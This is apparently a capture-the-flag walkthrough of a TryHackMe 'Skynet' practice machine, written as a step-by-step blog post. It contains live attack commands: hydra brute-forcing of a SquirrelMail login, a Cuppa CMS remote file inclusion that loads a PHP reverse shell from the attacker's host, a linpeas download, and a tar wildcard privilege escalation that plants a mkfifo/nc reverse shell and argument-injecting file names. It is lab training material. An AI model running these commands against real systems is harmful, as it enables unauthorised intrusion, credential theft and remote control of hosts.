Hello everyone, today we are going to walk through the Skynet room. To begin with scan the target machine with nmap.

```
nmap -sC -sV <ip>
```

![nmap-initial](/assets/images/thm/skynet/nmap-initial.png)

There are open ports 22, 80, 110, 139, 143 and 445. Go to the web page

![website](/assets/images/thm/skynet/website.png)

There is no useful information on the page so we are going to scan with smbmap

```
python3 smbmap.py -H 10.10.60.45
```

We can notice that there is anonymous share. Let's try to connect it.

![smbmap](/assets/images/thm/skynet/smbmap.png)

```
smbclient //<ip>/anonymous
```

![smbclient](/assets/images/thm/skynet/smbclient.png)

On the SMB server we find folder logs. There is 3 log files in it but only log1.txt has some content.
It looks as password and maybe one of them is the Miles password. I tried to brute SSH and POP3 but the result was unsuccessful <br />

Let's try to find other directories on the web server.

```
gobuster dir -u http://10.10.60.45/ -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster-initial](/assets/images/thm/skynet/gobuster-initial.png)

From the gobuster scan we have discovered a directory /squirrelmail

![squirrelmail](/assets/images/thm/skynet/squirrelmail.png)

Now we are going to try to brute force this login page. Type some username and password and catch the request with BurpSuite. <br />

Here is our error response

![error](/assets/images/thm/skynet/error.png)

Burp catching

![burp](/assets/images/thm/skynet/burp.png)

Now we need to create our payload with hydra username “miles” 

```
hydra -l miles -P log1.txt 10.10.60.45 http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect." 
```

We wasn't able to brute force it. Let's try with his lastname which we had found in the attention file on SMB anonymous share. <br />

Miles Dyson

```
hydra -l milesdyson -P log1.txt 10.10.60.45 http-form-post "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
```

![hydra](/assets/images/thm/skynet/hydra.png)

We can also use BurpSuite to brute force the password. Send the request to Intruder

![burp-brute](/assets/images/thm/skynet/burp-brute.png)

Go to the Payloads menu, upload the log1.txt file and start the attack.

![result](/assets/images/thm/skynet/result.png)

And we have logged in.

![webmail](/assets/images/thm/skynet/webmail.png)

Earlier we had found smb share milesdyson and from his inbox we can see what is the password for it

![smb-pass](/assets/images/thm/skynet/smb-pass.png)

Try to log in

```
smbclient //10.10.60.45/milesdyson -U milesdyson
```

When we list the directories we notice there is folder notes with a lot of files let's download all

```
cd notes/
mget *
```

there is a file importnant.txt open it

![important](/assets/images/thm/skynet/impotant.png)

/45kra24zxs28v3yd it looks as hidden directory

![web-hidden](/assets/images/thm/skynet/web-hidden.png)

There is no useful information. Let's scan this directory.

```
gobuster dir -u http://10.10.60.45/45kra24zxs28v3yd/ -w SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

```

![gobuster-second](/assets/images/thm/skynet/gobuster-second.png)

We have found administrator directory

![admin](/assets/images/thm/skynet/admin.png)

We can't log with the miles credentials. Search in Exploit DB for cuppa cms <br />

https://www.exploit-db.com/exploits/25971

![cms](/assets/images/thm/skynet/cms.png)

We are going to use monkeyReverseShell.php <br />

Start listener

![nc](/assets/images/thm/skynet/nc.png)

We also need to start python server to be able to download the php script into the target

```
python3 -m hettp.server
```

```
curl http://10.10.60.45/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.9.5.60:8000/monkeyReverseShell.php
```

![curl](/assets/images/thm/skynet/curl.png)

We are in 

![shell](/assets/images/thm/skynet/shell.png)

Stabalize shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

user flag is located at /home/milesdyson <br />

Privilege Escalation <br />

we are going to use linpeas

```
cd /dev/shm
wget http://10.9.5.60:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![linpeas](/assets/images/thm/skynet/linpeas.png)

There is a backup script that runs every minute and we have access to it. <br />

Google: tar wildcard exploit <br />
set listener

```
 nc -lvnp 4443
```

```
cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.5.60 4443 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
